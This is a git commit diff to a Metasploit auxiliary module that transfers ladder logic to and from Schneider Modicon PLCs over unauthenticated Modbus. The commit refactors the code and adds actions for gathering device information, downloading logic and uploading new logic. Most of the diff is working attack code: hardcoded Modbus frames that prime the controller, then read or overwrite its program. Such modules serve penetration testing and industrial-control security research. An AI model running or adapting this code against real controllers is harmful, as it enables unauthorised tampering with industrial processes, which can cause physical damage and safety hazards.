5f2d0fa18bd6724c58b84e9f1cba2d83fd48312a
Arnaud SOULLIE <soullie.arnaud@gmail.com>
2014-05-18 19:35:28 +0200

    Working for GATHER_INFOS and DOWNLOAD TODO : UPLOAD

--- modules/auxiliary/admin/scada/modicon_stux_transfer.rb
+++ modules/auxiliary/admin/scada/modicon_stux_transfer.rb
@@ -19,11 +19,10 @@ class Metasploit3 < Msf::Auxiliary
         unauthenticated, and allows a rogue host to retrieve the existing
         logic and to upload new logic.
 
-        Two modes are supported: "SEND" and "RECV," which behave as one might
-        expect -- use 'set mode ACTIONAME' to use either mode of operation.
-
+        Three actions are supported : Gather informations, 
+        download the ladder logic or upload a new ladder logic.
         In either mode, FILENAME must be set to a valid path to an existing
-        file (for SENDing) or a new file (for RECVing), and the directory must
+        file (UPLOAD) or a new file (DOWNLOAD), and the directory must
         already exist.  The default, 'modicon_ladder.apx' is a blank
         ladder logic file which can be used for testing.
 
@@ -41,7 +40,13 @@ class Metasploit3 < Msf::Auxiliary
         [
           [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]
         ],
-      'DisclosureDate' => 'Apr 5 2012'
+      'DisclosureDate' => 'Apr 5 2012',
+      'Actions'        =>
+        [
+          ['GATHER_INFOS', { 'Description' => 'Get informations about the PLC configuration' } ],
+          ['DOWNLOAD', { 'Description' => 'Download the ladder logic from the PLC' } ],
+          ['UPLOAD', { 'Description' => 'Upload a ladder logic file to the PLC' } ],
+        ]
       ))
 
     register_options(
@@ -52,12 +57,6 @@ class Metasploit3 < Msf::Auxiliary
             "The file to send or receive",
             File.join(Msf::Config.data_directory, "exploits", "modicon_ladder.apx")
           ]),
-        OptEnum.new("MODE", [true, 'File transfer operation', "SEND",
-          [
-            "SEND",
-            "RECV"
-          ]
-        ]),
         Opt::RPORT(502)
       ], self.class)
 
@@ -68,15 +67,35 @@ class Metasploit3 < Msf::Auxiliary
       print_error "FILENAME invalid: #{datastore['FILENAME'].inspect}"
       return nil
     end
-    @modbuscounter = 0x0000 # used for modbus frames
+    @modbus_counter = 0x0000 # used for modbus frames
     connect
     init
-    case datastore['MODE']
-    when "SEND"
-      writefile
-    when "RECV"
+    case datastore['ACTION']
+    when "DOWNLOAD"
       readfile
+    when "UPLOAD"
+      writefile
+    when "GATHER_INFOS"
+      gather_infos
     end
+  end
+
+  def handle_error(response)
+    case response.reverse.unpack("c")[0].to_i
+    when 1
+      print_error("Error : ILLEGAL FUNCTION")
+    when 2
+      print_error("Error : ILLEGAL DATA ADDRESS")
+    when 3
+      print_error("Error : ILLEGAL DATA VALUE")
+    when 4
+      print_error("Error : SLAVE DEVICE FAILURE")
+    when 6
+      print_error("Error : SLAVE DEVICE BUSY")
+    else
+      print_error("Unknown error")
+    end
+    exit
   end
 
   def valid_filename?
@@ -89,104 +108,127 @@ class Metasploit3 < Msf::Auxiliary
 
   # this is used for building a Modbus frame
   # just prepends the payload with a modbus header
-  def makeframe(packetdata)
+  def make_frame(packetdata)
     if packetdata.size > 255
       print_error("#{rhost}:#{rport} - MODBUS - Packet too large: #{packetdata.inspect}")
       return
     end
-    payload = ""
-    payload += [@modbuscounter].pack("n")
+    payload = [@modbus_counter].pack("n")
     payload += "\x00\x00\x00" #dunno what these are
     payload += [packetdata.size].pack("c") # size byte
     payload += packetdata
   end
 
   # a wrapper just to be sure we increment the counter
-  def sendframe(payload)
+  def send_frame(payload)
     sock.put(payload)
-    @modbuscounter += 1
-    # TODO: Fix with sock.timed_read -- Should make it faster, just need a test.
-    r = sock.recv(65535, 0.1)
-    return r
+    @modbus_counter += 1
+    r = sock.get(sock.def_read_timeout)
+    if r.nil?
+      print_error("No answer from target")
+      exit
+    elsif r.unpack("C*")[-2] == 218
+      handle_error(r)
+    else
+      return r
+    end
   end
 
   # This function sends some initialization requests
   # required for priming the Quantum
   def init
-    payload = "\x00\x5a\x00\x02"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x01\x00"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x0a\x00" + 'T' * 0xf9
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x03\x00"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x03\x04"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x04"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x01\x00"
-    sendframe(makeframe(payload))
+    send_frame(make_frame("\x00\x5a\x00\x02"))
+    send_frame(make_frame("\x00\x5a\x00\x01\x00"))
+    send_frame(make_frame("\x00\x5a\x00\x0a\x00" + 'T' * 0xf9))
+    send_frame(make_frame("\x00\x5a\x00\x03\x00"))
+    send_frame(make_frame("\x00\x5a\x00\x03\x04"))
+    send_frame(make_frame("\x00\x5a\x00\x04"))
+    send_frame(make_frame("\x00\x5a\x00\x01\x00"))
     payload = "\x00\x5a\x00\x0a\x00"
     (0..0xf9).each { |x| payload += [x].pack("c") }
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x04"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x04"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x20\x00\x13\x00\x00\x00\x00\x00\x64\x00"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x20\x00\x13\x00\x64\x00\x00\x00\x9c\x00"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x20\x00\x14\x00\x00\x00\x00\x00\x64\x00"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x20\x00\x14\x00\x64\x00\x00\x00\xf6\x00"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x20\x00\x14\x00\x5a\x01\x00\x00\xf6\x00"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x20\x00\x14\x00\x5a\x02\x00\x00\xf6\x00"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x20\x00\x14\x00\x46\x03\x00\x00\xf6\x00"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x20\x00\x14\x00\x3c\x04\x00\x00\xf6\x00"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x20\x00\x14\x00\x32\x05\x00\x00\xf6\x00"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x20\x00\x14\x00\x28\x06\x00\x00\x0c\x00"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x20\x00\x13\x00\x00\x00\x00\x00\x64\x00"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x20\x00\x13\x00\x64\x00\x00\x00\x9c\x00"
-    sendframe(makeframe(payload))
+    send_frame(make_frame(payload))
+    send_frame(make_frame("\x00\x5a\x00\x04"))
+    send_frame(make_frame("\x00\x5a\x00\x04"))
+    send_frame(make_frame("\x00\x5a\x00\x20\x00\x13\x00\x00\x00\x00\x00\x64\x00"))
+    send_frame(make_frame("\x00\x5a\x00\x20\x00\x13\x00\x64\x00\x00\x00\x9c\x00"))
+    send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x00\x00\x00\x00\x64\x00"))
+    send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x64\x00\x00\x00\xf6\x00"))
+    send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x5a\x01\x00\x00\xf6\x00"))
+    send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x5a\x02\x00\x00\xf6\x00"))
+    send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x46\x03\x00\x00\xf6\x00"))
+    send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x3c\x04\x00\x00\xf6\x00"))
+    send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x32\x05\x00\x00\xf6\x00"))
+    send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x28\x06\x00\x00\x0c\x00"))
+    send_frame(make_frame("\x00\x5a\x00\x20\x00\x13\x00\x00\x00\x00\x00\x64\x00"))
+    send_frame(make_frame("\x00\x5a\x00\x20\x00\x13\x00\x64\x00\x00\x00\x9c\x00"))
     payload = "\x00\x5a\x00\x10\x43\x4c\x00\x00\x0f"
-    payload += "USER-714E74F21B" # Yep, really
-    #payload += "META-SPLOITMETA"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x01\x04"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x01\x50\x15\x00\x01\x0b"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x01\x50\x15\x00\x01\x07"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x01\x12"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x01\x04"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x01\x12"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x01\x04"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x02"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x58\x01\x00\x00\x00\x00\xff\xff\x00\x70"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x58\x07\x01\x80\x00\x00\x00\x00\xfb\x00"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x01\x04"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x58\x07\x01\x80\x00\x00\x00\x00\xfb\x00"
-    sendframe(makeframe(payload))
+    #payload += "USER-714E74F21B" # Yep, really
+    payload += "META-SPLOITMETA"
+    send_frame(make_frame(payload))
+    send_frame(make_frame("\x00\x5a\x01\x04"))
+    send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x01\x0b"))
+    send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x01\x07"))
+    send_frame(make_frame("\x00\x5a\x01\x12"))
+    send_frame(make_frame("\x00\x5a\x01\x04"))
+    send_frame(make_frame("\x00\x5a\x01\x12"))
+    send_frame(make_frame("\x00\x5a\x01\x04"))
+    send_frame(make_frame("\x00\x5a\x00\x02"))
+    send_frame(make_frame("\x00\x5a\x00\x58\x01\x00\x00\x00\x00\xff\xff\x00\x70")) 
+    send_frame(make_frame("\x00\x5a\x00\x58\x07\x01\x80\x00\x00\x00\x00\xfb\x00"))
+    send_frame(make_frame("\x00\x5a\x01\x04"))
+    send_frame(make_frame("\x00\x5a\x00\x58\x07\x01\x80\x00\x00\x00\x00\xfb\x00"))
   end
+
+  
+  def gather_infos
+    print_status("Sending initialization requests ...")
+    api = send_frame(make_frame("\x00\x5a\x00\x02"))
+    print_good("PLC model : " + api.split[1].to_s + ' ' + api.split[2] + ' ' + api.split[3][0..3])
+    send_frame(make_frame("\x00\x5a\x00\x01\x00"))
+    send_frame(make_frame("\x00\x5a\x00\x0a\x00" + 'T' * 0xf9))
+    project_name = send_frame(make_frame("\x00\x5a\x00\x03\x00"))
+    print_good('Project name : ' + project_name.split[2].to_s)
+    send_frame(make_frame("\x00\x5a\x00\x03\x04"))
+    send_frame(make_frame("\x00\x5a\x00\x04"))
+    send_frame(make_frame("\x00\x5a\x00\x01\x00"))
+    payload = "\x00\x5a\x00\x0a\x00"
+    (0..0xf9).each { |x| payload += [x].pack("c") }
+    send_frame(make_frame(payload))
+    send_frame(make_frame("\x00\x5a\x00\x04"))
+    send_frame(make_frame("\x00\x5a\x00\x04"))
+    send_frame(make_frame("\x00\x5a\x00\x20\x00\x13\x00\x00\x00\x00\x00\x64\x00"))
+    send_frame(make_frame("\x00\x5a\x00\x20\x00\x13\x00\x64\x00\x00\x00\x9c\x00"))
+    send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x00\x00\x00\x00\x64\x00"))
+    data = send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x64\x00\x00\x00\xf6\x00"))
+    tableau = []
+    data.bytes.each do |byte|
+      tableau.push(byte.to_s)
+    end
+    @uaelbat = tableau.reverse
+    nb_to_delete = 1
+    for i in 1..tableau.size
+      if @uaelbat[i].to_s != '0'
+        break
+      elsif @uaelbat[i].to_s == '0'
+        nb_to_delete +=1
+      end
+    end 
+    tableau2 = @uaelbat[nb_to_delete..@uaelbat.size]
+    test = tableau2.split('0')
+    unity_version = ''
+    test[0].each do |char|
+      unity_version += [char.to_i].pack("c")
+    end
+    print_good("Unity software version : " + unity_version.reverse)
+    comments =''
+    test[7].each do |char|
+      comments += [char.to_i].pack("c")
+    end
+    print_good("Project comments : " + comments.reverse)
+  end
+
+
+
 
   # Write the contents of local file filename to the target's filenumber
   # blank logic files will be available on the Digital Bond website
@@ -210,23 +252,14 @@ class Metasploit3 < Msf::Auxiliary
     elsif filetype == "APB"
       filenum = "\x10"
     end
-    payload = "\x00\x5a\x00\x03\x01"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x02"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x01\x04"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x02"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x01\x04"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x58\x02\x01\x00\x00\x00\x00\x00\xfb\x00"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x00\x02"
-    sendframe(makeframe(payload))
-    payload = "\x00\x5a\x01\x30\x00"
-    payload += filenum
-    response = sendframe(makeframe(payload))
+    send_frame(make_frame("\x00\x5a\x00\x03\x01"))
+    send_frame(make_frame("\x00\x5a\x00\x02"))
+    send_frame(make_frame("\x00\x5a\x01\x04"))
+    send_frame(make_frame("\x00\x5a\x00\x02"))
+    send_frame(make_frame("\x00\x5a\x01\x04"))
+    send_frame(make_frame("\x00\x5a\x00\x58\x02\x01\x00\x00\x00\x00\x00\xfb\x00"))
+    send_frame(make_frame("\x00\x5a\x00\x02"))
+    response = send_frame(make_frame("\x00\x5a\x01\x30\x00" + filenum))
     if response[8..9] == "\x01\xfe"
       print_status("#{rhost}:#{rport} - MODBUS - Write request success!  Writing file...")
     else
@@ -234,7 +267,7 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
     payload = "\x00\x5a\x01\x04"
-    sendframe(makeframe(payload))
+    send_frame(make_frame(payload))
     block = 1
     block2status = 0 # block 2 must always be sent twice
     while block <= fullblocks
@@ -243,7 +276,7 @@ class Metasploit3 < Msf::Auxiliary
       payload += [block].pack("c")
       payload += "\x00\xf4\x00"
       payload += buf[((block - 1) * 244)..((block * 244) - 1)]
-      res = sendframe(makeframe(payload))
+      res = send_frame(make_frame(payload))
       vprint_status "#{rhost}:#{rport} - MODBUS - Block #{block}: #{payload.inspect}"
       if res[8..9] != "\x01\xfe"
         print_error("#{rhost}:#{rport} - MODBUS - Failure writing block #{block}")
@@ -264,7 +297,7 @@ class Metasploit3 < Msf::Auxiliary
       payload += "\x00" + [lastblocksize].pack("c") + "\x00"
       payload += buf[((block-1) * 244)..(((block-1) * 244) + lastblocksize)]
       vprint_status "#{rhost}:#{rport} - MODBUS - Block #{block}: #{payload.inspect}"
-      res = sendframe(makeframe(payload))
+      res = send_frame(make_frame(payload))
       if res[8..9] != "\x01\xfe"
         print_error("#{rhost}:#{rport} - MODBUS - Failure writing last block")
         return
@@ -272,15 +305,14 @@ class Metasploit3 < Msf::Auxiliary
     end
     vprint_status "#{rhost}:#{rport} - MODBUS - Closing file"
     payload = "\x00\x5a\x01\x32\x00\x01" + [fileblocks].pack("c") + "\x00"
-    sendframe(makeframe(payload))
+    send_frame(make_frame(payload))
   end
 
   # Only reading the STL file is supported at the moment :(
   def readfile
     print_status "#{rhost}:#{rport} - MODBUS - Sending read request"
     file = File.open(datastore['FILENAME'], 'wb')
-    payload = "\x00\x5a\x01\x33\x00\x01\xfb\x00"
-    response = sendframe(makeframe(payload))
+    response = send_frame(make_frame("\x00\x5a\x01\x33\x00\x01\xfb\x00"))
     print_status("#{rhost}:#{rport} - MODBUS - Retrieving file")
     block = 1
     block2 = 0
@@ -295,18 +327,20 @@ class Metasploit3 < Msf::Auxiliary
       payload += [block].pack("c")
       payload += [block2].pack("c")
       payload += "\x00"
-      response = sendframe(makeframe(payload))
+      response = send_frame(make_frame(payload))
       filedata += response[0xe..-1]
-      vprint_status "#{rhost}:#{rport} - MODBUS - Block #{block}: #{response[0xe..-1].inspect}"
+      vprint_status "#{rhost}:#{rport} - MODBUS - Block #{block2*255+block}: #{response[0xe..-1].inspect}"
       if response[0xa] == "\x01" # apparently 0x00 == more data, 0x01 == eof?
         finished = true
       else
         block += 1
       end
     end
-    print_status("#{rhost}:#{rport} - MODBUS - Closing file")
+    print_status("#{rhost}:#{rport} - MODBUS - Closing file  '#{datastore['FILENAME']}'")
     payload = "\x00\x5a\x01\x35\x00\x01" + [block].pack("c") + "\x00"
-    sendframe(makeframe(payload))
+    send_frame(make_frame(payload))
+    # I cannot use store_loot as the "session" variable is undefined. Is it because it is an auxiliary module ?
+    #loot = store_loot('schneider.ladder_logic', 'application/octet-stream', session, filedata, 'Station.apx', 'Schneider Modicon ladder logic')
     file.print filedata
     file.close
   end
